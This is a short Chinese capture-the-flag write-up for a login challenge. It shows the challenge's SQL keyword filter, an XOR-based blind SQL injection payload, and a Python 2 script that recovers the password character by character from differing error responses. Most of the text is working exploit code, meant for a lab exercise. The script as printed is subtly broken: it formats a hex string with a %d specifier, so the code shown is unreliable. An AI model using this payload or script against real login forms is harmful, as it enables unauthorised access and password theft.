# login


## writeup

这道题的过滤规则为：
```regx
mid|substr|\s|and|select|from|where|union|join|sleep|benchmark|rollup|limit|like|rlike|regxp
```
没有过滤运算符+ - ^ > <等以及一些字符串处理函数，而且正确与错误的用户名的回显不同，可以利用这一点实现盲注。
使用的payload为：
```
admin'^(left(pwd,%d)=%d)^'
```

盲注脚本：
```python
#coding=utf-8
import urllib2
import urllib

t=""
for i in range(1,500):
    for j in range(28,128):
        params={"uname":"admin'^(left(pwd,%d)=%d)^'"%(i,"0x"+(t+chr(j)).encode('hex')),"pwd":"xxxxx"}
        url="地址?"+urllib.urlencode(params)
        print url
        ans=urllib2.urlopen(url).read()
        #print ans
        #print chr(j)
        if "no such user!" in ans:
            t+=chr(j)
            print t
            break
    print "a loop"

```
用获取的密码登录即可获取flag。
